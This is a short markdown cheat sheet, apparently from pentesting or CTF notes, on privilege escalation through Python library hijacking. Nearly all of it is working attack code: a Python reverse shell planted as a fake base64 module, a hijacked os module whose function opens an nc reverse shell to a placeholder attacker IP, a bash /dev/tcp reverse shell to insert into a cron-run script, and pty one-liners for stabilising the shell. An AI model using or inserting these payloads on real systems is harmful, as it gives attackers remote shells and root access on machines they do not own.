## Python Library Hijack

- base64

````python
#!/usr/bin/python3  
from os import dup2  
from subprocess import run  
import socket  
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)  
s.connect(("LOCAL_IP",1234))   
dup2(s.fileno(),0)   
dup2(s.fileno(),1)   
dup2(s.fileno(),2)   
run(["/bin/bash","-i"])
````

- OS

```python
import os

def choice(a):

	os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP_ATTCK PORT>/tmp/f")
```

- Edit an script running in a crontab:

```bash
bash -i >& /dev/tcp/IP_ATTCK/PORT 0>&1
```


- How to stabilise a shell:
````shell
python -c "import pty; pty.spawn('/bin/bash')" 
python3 -c "import pty; pty.spawn('/bin/bash')" 
````